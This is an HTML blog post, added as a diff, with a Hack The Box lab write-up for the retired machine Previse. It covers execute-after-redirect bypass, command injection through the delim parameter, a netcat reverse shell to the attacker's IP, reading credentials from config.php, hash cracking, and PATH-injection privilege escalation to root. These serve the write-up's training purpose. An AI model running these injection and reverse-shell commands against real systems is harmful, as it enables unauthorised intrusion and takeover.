@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hack The Box Write-Up: Previse - Tejas Luthra</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/05be29d559.js" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="/assets/css/styles.css">
+    <link rel="stylesheet" href="/assets/css/blog.css">
+    <link rel="stylesheet" href="/assets/css/post.css">
+</head>
+<body>
+    <nav class="nav">
+        <div class="nav-container">
+            <a href="/" class="nav-logo">TL</a>
+            <div class="nav-links">
+                <a href="/#projects">Projects</a>
+                <a href="/blog">Blog</a>
+                <a href="mailto:hello@tejasl.com">Contact</a>
+                <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
+                    <i class="fas fa-moon"></i>
+                </button>
+            </div>
+        </div>
+    </nav>
+
+    <article class="post-container">
+        <header class="post-header">
+            <a href="/blog" class="back-link">
+                <i class="fas fa-arrow-left"></i> Back to Blog
+            </a>
+            
+            <div class="post-meta-header">
+                
+                
+                <span class="difficulty difficulty-easy">
+                    Easy
+                </span>
+                
+            </div>
+            
+            <h1>Hack The Box Write-Up: Previse</h1>
+            
+            <div class="post-info">
+                <time datetime="2025-10-22T00:00:00-06:00">
+                    <i class="fas fa-calendar"></i>
+                    October 22, 2025
+                </time>
+                
+            </div>
+            
+            
+            <div class="post-tags-header">
+                
+                <span class="tag">Path Injection</span>
+                
+                <span class="tag">Linux</span>
+                
+                <span class="tag">Command Injection</span>
+                
+                <span class="tag">Hashcat</span>
+                
+                <span class="tag">HTB</span>
+                
+                <span class="tag">Writeup</span>
+                
+                <span class="tag">Retired Boxes</span>
+                
+            </div>
+            
+        </header>
+
+        <div class="post-content">
+            <style>
+.machine-info {
+    text-align: center;
+    margin: 2rem auto;
+    max-width: 600px;
+}
+
+.machine-info img {
+    margin: 1rem auto 2rem;
+    display: block;
+    max-width: 300px;
+}
+
+.machine-info ul {
+    list-style: none;
+    padding: 0;
+    margin: 0 auto;
+    display: inline-block;
+    text-align: left;
+}
+
+.machine-info ul li {
+    margin-bottom: 0.5rem;
+}
+</style>
+
+<div class="machine-info">
+  <img src="/assets/posts/htb-previse/Previse-logo.png" alt="Previse Logo" />
+  
+  <ul>
+    <li><strong>Category:</strong> Hack The Box</li>
+    <li><strong>Operating System:</strong> Linux</li>
+    <li><strong>Release Date:</strong> August 07, 2021</li>
+    <li><strong>Difficulty:</strong> Easy</li>
+    <li><strong>Link:</strong> <a href="https://www.hackthebox.com/machines/Previse">Previse</a></li>
+    <li><strong>Created By:</strong> <a href="https://app.hackthebox.com/profile/107145">m4lwhere</a></li>
+  </ul>
+</div>
+
+<h2 id="recon">Recon</h2>
+<h3 id="scanning">Scanning</h3>
+
+<p>We will start by mapping the <code class="language-plaintext highlighter-rouge">previse.htb</code> hostname to the IP address of the box. Your <code class="language-plaintext highlighter-rouge">/etc/hosts</code> should contain this entry. Make sure you replace the IP provided with the one given to you:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~ <span class="nb">cat</span> /etc/hosts
+10.129.95.185 previse.htb
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">nmap</code> found two open TCP ports, SSH (22) and HTTP (80):</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~ nmap <span class="nt">-sVC</span> 10.129.95.185
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+| http-title: Previse Login
+|_Requested resource was login.php
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not <span class="nb">set
+</span>Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>When we access <code class="language-plaintext highlighter-rouge">previse.htb</code>, we are redirected to a login page:</p>
+
+<p><img src="/assets/posts/htb-previse/previse-login-screen.png" alt="Previse Login Screen" /></p>
+
+<p><em>Figure 1: Previse Login Screen</em></p>
+
+<p>After trying out some default usernames and passwords, nothing worked. I then ran <code class="language-plaintext highlighter-rouge">ffuf</code> to find subdirectories.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~ ffuf <span class="nt">-u</span> http://previse.htb/FUZZ <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt <span class="nt">-e</span> .php <span class="nt">-fc</span> 403,404,303,405
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://previse.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
+ :: Extensions       : .php 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response status: 403,404,303,405
+________________________________________________
+
+accounts.php            [Status: 302, Size: 3994, Words: 1096, Lines: 94, Duration: 63ms]
+config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 54ms]
+css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 57ms]
+download.php            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 62ms]
+favicon.ico             [Status: 200, Size: 15406, Words: 15, Lines: 10, Duration: 59ms]
+files.php               [Status: 302, Size: 4914, Words: 1531, Lines: 113, Duration: 59ms]
+footer.php              [Status: 200, Size: 217, Words: 10, Lines: 6, Duration: 61ms]
+header.php              [Status: 200, Size: 980, Words: 183, Lines: 21, Duration: 64ms]
+index.php               [Status: 302, Size: 2801, Words: 737, Lines: 72, Duration: 59ms]
+js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 60ms]
+login.php               [Status: 200, Size: 2224, Words: 486, Lines: 54, Duration: 63ms]
+logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 58ms]
+logs.php                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 66ms]
+nav.php                 [Status: 200, Size: 1248, Words: 462, Lines: 32, Duration: 61ms]
+status.php              [Status: 302, Size: 2966, Words: 749, Lines: 75, Duration: 59ms]
+:: Progress: [40956/40956] :: Job [1/1] :: 680 req/sec :: Duration: [0:01:04] :: Errors: 0 ::
+</span></code></pre></div></div>
+<p>From there, I started looking at all the pages and almost everything redirected to <code class="language-plaintext highlighter-rouge">/login.php</code> but <code class="language-plaintext highlighter-rouge">nav.php</code> had some interesting links:</p>
+
+<p><img src="/assets/posts/htb-previse/nav-php.png" alt="Previse nav.php" /></p>
+
+<p><em>Figure 2: /nav.php</em></p>
+
+<p>The links are:</p>
+<ul>
+  <li>Home: <code class="language-plaintext highlighter-rouge">/index.php</code></li>
+  <li>Accounts + Create Account: <code class="language-plaintext highlighter-rouge">/accounts.php</code></li>
+  <li>Files: <code class="language-plaintext highlighter-rouge">/files.php</code></li>
+  <li>Management Menu + Website Status: <code class="language-plaintext highlighter-rouge">/status.php</code></li>
+  <li>Log data: <code class="language-plaintext highlighter-rouge">/file_logs.php</code></li>
+</ul>
+
+<p>When clicking on the links, they all redirect to <code class="language-plaintext highlighter-rouge">/login.php</code> because we are not authenticated.</p>
+
+<h3 id="execute-after-redirect-ear-vulnerability">Execute After Redirect (EAR) Vulnerability</h3>
+
+<p>After inspecting reqeuests in burpsuite, we notice that the <code class="language-plaintext highlighter-rouge">/</code> returns a HTTP 302 redirect to <code class="language-plaintext highlighter-rouge">/login.php</code>. However, there’s also a full page in that response:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 23 Oct 2025 05:34:27 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.29 (Ubuntu)</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Location</span><span class="p">:</span> <span class="s">login.php</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">2801</span>
+<span class="na">Keep-Alive</span><span class="p">:</span> <span class="s">timeout=5, max=100</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">Keep-Alive</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+
+<span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+    <span class="nt">&lt;head&gt;</span>
+        <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"content-type"</span> <span class="na">content=</span><span class="s">"text/html; charset=UTF-8"</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span> <span class="nt">/&gt;</span>
+                
+        <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1.0"</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"description"</span> <span class="na">content=</span><span class="s">"Previse rocks your socks."</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"author"</span> <span class="na">content=</span><span class="s">"m4lwhere"</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"shortcut icon"</span> <span class="na">href=</span><span class="s">"/favicon.ico"</span> <span class="na">type=</span><span class="s">"image/x-icon"</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"icon"</span> <span class="na">href=</span><span class="s">"/favicon.ico"</span> <span class="na">type=</span><span class="s">"image/x-icon"</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"apple-touch-icon"</span> <span class="na">sizes=</span><span class="s">"180x180"</span> <span class="na">href=</span><span class="s">"/apple-touch-icon.png"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"icon"</span> <span class="na">type=</span><span class="s">"image/png"</span> <span class="na">sizes=</span><span class="s">"32x32"</span> <span class="na">href=</span><span class="s">"/favicon-32x32.png"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"icon"</span> <span class="na">type=</span><span class="s">"image/png"</span> <span class="na">sizes=</span><span class="s">"16x16"</span> <span class="na">href=</span><span class="s">"/favicon-16x16.png"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"manifest"</span> <span class="na">href=</span><span class="s">"/site.webmanifest"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"css/uikit.min.css"</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"js/uikit.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+        <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"js/uikit-icons.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+...<span class="nt">&lt;SNIP&gt;</span>...
+</code></pre></div></div>
+
+<p>This is a classic example of an execution after redirect (EAR) vulnerability.</p>
+
+<h3 id="skiping-redirects">Skiping Redirects</h3>
+
+<p>By default, Burp intercept only stops requests, not responses. To see the root page, you’ll have to turn on Server Response Interception in Burp Proxy, and then turn Intercept on (Indicated by the red rectangle):</p>
+
+<p><img src="/assets/posts/htb-previse/burp-response-interception.png" alt="Previse Burp-Reponse-Interception" /></p>
+
+<p><em>Figure 3: Turning on Burpsuite’s Response Interception</em></p>
+
+<p>After that, I will go to <code class="language-plaintext highlighter-rouge">http://previse.htb</code> in the burp browser, forwarding the request without changes, and Burpsuite catches the response:</p>
+
+<p><img src="/assets/posts/htb-previse/burp-response.png" alt="Previse Burp-Reponse" /></p>
+
+<p><em>Figure 4: Burpsuite Intercepting the Response</em></p>
+
+<p>After changing the response code from <code class="language-plaintext highlighter-rouge">302</code> to <code class="language-plaintext highlighter-rouge">200</code>, we can see that the page comes back:</p>
+
+<p><img src="/assets/posts/htb-previse/page-change-response.png" alt="Previse Code-change-Response" /></p>
+
+<p><em>Figure 5: Response on the Page</em></p>
+
+<p>From there, we can go to <code class="language-plaintext highlighter-rouge">accounts.php</code> using the same process that we did before. That page has a message saying that only admins should be here, which probably means that we can use it to exploit the application:</p>
+
+<p><img src="/assets/posts/htb-previse/accounts-php.png" alt="Previse accounts-php" /></p>
+
+<p><em>Figure 6: /accounts.php</em></p>
+
+<p>After that, we fill out the form and create a new account. After that, we can turn off Burpsuite and log into the web app normally.</p>
+
+<p><img src="/assets/posts/htb-previse/account-creation.png" alt="Previse account-creation" /></p>
+
+<p><em>Figure 7: Account Creation</em></p>
+
+<h3 id="log-data">Log Data</h3>
+
+<p>After Logging in, I visited the <code class="language-plaintext highlighter-rouge">/file_logs.php</code> and was able to request the log data:</p>
+
+<p><img src="/assets/posts/htb-previse/log-data.png" alt="Previse log-data" /></p>
+
+<p><em>Figure 8: Log Data</em></p>
+
+<h2 id="inital-access">Inital Access</h2>
+
+<p>Looking at Burpsuite and performing more enumeration, we can notice that the <code class="language-plaintext highlighter-rouge">POST</code> request to <code class="language-plaintext highlighter-rouge">/logs.php</code> sends a <code class="language-plaintext highlighter-rouge">delim=comma</code> parameter.</p>
+
+<p><img src="/assets/posts/htb-previse/burp-delim.png" alt="Previse burp-delim-comma" /></p>
+
+<p><em>Figure 9: Response with the delim parameter set to comma</em></p>
+
+<p>After trying to change the parameter to something that is not one of the options in the dropdown (<code class="language-plaintext highlighter-rouge">delim=taco</code>), we can see that we get the same response as a comma.</p>
+
+<p><img src="/assets/posts/htb-previse/burp-delim-space.png" alt="Previse burp-delim-space" /></p>
+
+<p><em>Figure 10: Response with the delim parameter set to space</em></p>
+
+<p><img src="/assets/posts/htb-previse/burp-delim-taco.png" alt="Previse burp-delim-taco" /></p>
+
+<p><em>Figure 11: Response with the delim parameter set to taco</em></p>
+
+<p>We can try and abuse the <code class="language-plaintext highlighter-rouge">delim=taco</code> parameter to see if we can gain command injection. This can be done by adding a <code class="language-plaintext highlighter-rouge">;curl%20http://10.10.14.6:8888</code> at the end of the request and hosting a python server (<code class="language-plaintext highlighter-rouge">python -m http.server 8888</code>) to see if the command is executed:</p>
+
+<p><img src="/assets/posts/htb-previse/burp-cmd-injection.png" alt="Previse burp-cmd-injection" />
+<em>Figure 12: Command Execution</em></p>
+
+<p>From there, we can get a reverse shell by adding this command in the command injection and starting a listener on our local machine:</p>
+
+<p>Revshell cmd: <code class="language-plaintext highlighter-rouge">nc%2010.10.14.6%204444%20-e%20/bin/sh</code></p>
+
+<p><img src="/assets/posts/htb-previse/burp-revshell.png" alt="Previse burp-revshell" /></p>
+
+<p><em>Figure 13: Reverse Shell as www-data</em></p>
+
+<p>After that, you can use a python command to spawn a <code class="language-plaintext highlighter-rouge">/bin/bash</code> shell.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="sh">'</span><span class="s">import pty; pty.spawn(</span><span class="sh">"</span><span class="s">/bin/bash</span><span class="sh">"</span><span class="s">)</span><span class="sh">'</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation-to-m4lwhere">Privilege Escalation to m4lwhere</h2>
+<p>After getting access to the system as <code class="language-plaintext highlighter-rouge">www-data</code>, we perform system enumeration and find the password to the database in <code class="language-plaintext highlighter-rouge">/var/www/html/config.php</code>:</p>
+
+<p><img src="/assets/posts/htb-previse/db-password.png" alt="Previse burp-revshell" /></p>
+
+<p><em>Figure 14: Database Password</em></p>
+
+<p>From there, we can use these creds to connect to the database using the follwing command:</p>
+
+<p>Command to connect to the database: <code class="language-plaintext highlighter-rouge">mysql -u root -p</code></p>
+
+<p><img src="/assets/posts/htb-previse/db-connection.png" alt="Previse database" />
+<em>Figure 15: Connecting to the Database</em></p>
+
+<p>From there, you can connect to the database and show tables to dump the accounts.</p>
+
+<p><img src="/assets/posts/htb-previse/db-dump.png" alt="Previse dumping-database" /></p>
+
+<p><em>Figure 16: Dumping the Database Tables</em></p>
+
+<p>After dumping the tables, we can see the hashe for the user that we created and m4lwhere. We copy out the hashes to a different file to try and crack them using hashcat.</p>
+
+<p>Hashcat Command: <code class="language-plaintext highlighter-rouge">hashcat -m500 user.hash /usr/share/wordlists/rockyou.txt</code></p>
+
+<p><img src="/assets/posts/htb-previse/crack-hash.png" alt="Previse cracking-hashes" /></p>
+
+<p><em>Figure 17: Cracking the hashes with hashcat</em></p>
+
+<p>From there, we can SSH as <code class="language-plaintext highlighter-rouge">m4lwhere</code> onto the machine and get the user flag.</p>
+
+<p><img src="/assets/posts/htb-previse/user-flag.png" alt="Previse user-flag" /></p>
+
+<p><em>Figure 18: User Flag</em></p>
+
+<h2 id="privilege-escalation-to-root">Privilege Escalation to root</h2>
+<p>After gaining access to the user <code class="language-plaintext highlighter-rouge">m4lwhere</code>, we run <code class="language-plaintext highlighter-rouge">sudo -l</code> to see what commands the user run as sudo. We can see that the user can run <code class="language-plaintext highlighter-rouge">/opt/scripts/access_backup.sh</code> as root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>m4lwhere@previse:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>m4lwhere: 
+User m4lwhere may run the following commands on previse:
+    <span class="o">(</span>root<span class="o">)</span> /opt/scripts/access_backup.sh
+m4lwhere@previse:~<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>Looking at the script, we can see that it uses the <code class="language-plaintext highlighter-rouge">/bin/gzip</code> binary to backup the directories:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>m4lwhere@previse:~<span class="nv">$ </span><span class="nb">cat</span> /opt/scripts/access_backup.sh 
+<span class="c">#!/bin/bash</span>
+
+<span class="c"># We always make sure to store logs, we take security SERIOUSLY here</span>
+
+<span class="c"># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span>
+<span class="c"># This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time</span>
+
+<span class="nb">gzip</span> <span class="nt">-c</span> /var/log/apache2/access.log <span class="o">&gt;</span> /var/backups/<span class="si">$(</span><span class="nb">date</span> <span class="nt">--date</span><span class="o">=</span><span class="s2">"yesterday"</span> +%Y%b%d<span class="si">)</span>_access.gz
+<span class="nb">gzip</span> <span class="nt">-c</span> /var/www/file_access.log <span class="o">&gt;</span> /var/backups/<span class="si">$(</span><span class="nb">date</span> <span class="nt">--date</span><span class="o">=</span><span class="s2">"yesterday"</span> +%Y%b%d<span class="si">)</span>_file_access.gz
+m4lwhere@previse:~<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>We can see that gzip is called without a complete path. This means that we can use Path Injection and set the SUID bit on <code class="language-plaintext highlighter-rouge">/bin/bash</code> to spawn a root shell. Here are the commands for it:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>m4lwhere@previse:~<span class="nv">$ </span><span class="nb">mkdir</span> /tmp/evil
+m4lwhere@previse:~<span class="nv">$ </span>vim /tmp/evil/gzip
+m4lwhere@previse:~<span class="nv">$ </span><span class="nb">cat</span> /tmp/evil/gzip 
+<span class="c">#!/bin/bash</span>
+<span class="nb">chmod </span>u+s /bin/bash
+m4lwhere@previse:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp/evil:<span class="nv">$PATH</span>
+</code></pre></div></div>
+
+<p>From there, we can run the <code class="language-plaintext highlighter-rouge">access_backup.sh</code> script and that will set the SUID bit on the <code class="language-plaintext highlighter-rouge">/bin/bash</code> binary, which we can use to spawn a root shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>m4lwhere@previse:~<span class="nv">$ </span><span class="nb">sudo </span><span class="nv">PATH</span><span class="o">=</span>/tmp/evil:<span class="nv">$PATH</span> /opt/scripts/access_backup.sh
+m4lwhere@previse:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /bin/bash 
+<span class="nt">-rwsr-xr-x</span> 1 root root 1113504 Jun  6  2019 /bin/bash
+m4lwhere@previse:~<span class="nv">$ </span>/bin/bash <span class="nt">-p</span>
+bash-4.4#
+</code></pre></div></div>
+
+<p><img src="/assets/posts/htb-previse/root-flag.png" alt="Previse root-flag" /></p>
+
+<p><em>Figure 19: Root Flag</em></p>
+
+        </div>
+
+        <footer class="post-footer">
+            <a href="/blog" class="back-to-blog">
+                <i class="fas fa-arrow-left"></i> Back to all posts
+            </a>
+        </footer>
+    </article>
+
+    <script src="/assets/js/script.js"></script>
+</body>
+</html>
